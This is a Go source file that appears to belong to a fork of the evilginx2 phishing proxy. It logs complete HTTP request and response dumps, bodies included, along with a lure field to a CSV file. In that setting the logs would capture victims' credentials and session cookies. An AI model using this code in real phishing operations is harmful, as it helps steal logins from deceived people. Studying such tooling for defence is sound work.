package core

import (
	"encoding/csv"
	"net/http"
	"net/http/httputil"
	"os"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type LogItem struct {
	Timestamp time.Time
	SourceIP  string // i know that there is a net.IP type, but I would just turn it back into a string anyway
	DestIP    string
	Body      string
	Lureinfo  string
}

func (i *LogItem) stringarray() []string {
	r := []string{i.Timestamp.String(), i.SourceIP, i.DestIP, i.Body, i.Lureinfo}
	return r
}

func LogDual(req *http.Request, res *http.Response) {
	LogRequest(req)
	LogResponse(res)
}

func LogRequest(req *http.Request) {
	l := Logger{Enabled: true, Filename: "log.csv"}
	log.Debug("LogRequest Started")
	reqDump, _ := httputil.DumpRequest(req, true)
	i := LogItem{
		Timestamp: time.Now(),
		SourceIP:  req.RemoteAddr,
		DestIP:    "127.0.0.1:80",
		Body:      string(reqDump),
	}
	l.append(i)
}

func LogResponse(res *http.Response) {
	l := Logger{Enabled: true, Filename: "log.csv"}
	log.Debug("LogResponse Started")
	resDump, _ := httputil.DumpResponse(res, true)
	i := LogItem{
		Timestamp: time.Now(),
		SourceIP:  "127.0.0.1:80",
		DestIP:    res.Request.RemoteAddr,
		Body:      string(resDump),
	}
	l.append(i)
}

func (l *Logger) append(i LogItem) {
	log.Debug("Logger.append() Started")
	logfile := "/app/log/" + l.Filename
	f, err := os.OpenFile(logfile, os.O_APPEND|os.O_WRONLY, os.ModeAppend)
	if err != nil {
		log.Error("Logger.append() error in os.OpenFile: %s", err)
	}

	w := csv.NewWriter(f)
	err = w.Write(i.stringarray())
	if err != nil {
		log.Error("Logger.append() error in csv.NewWriter().Write(): %s", err)
	}
	w.Flush() // not deferred anymore
	f.Close() // not deferred anymore
	log.Debug("Log appending complete: " + logfile)
}
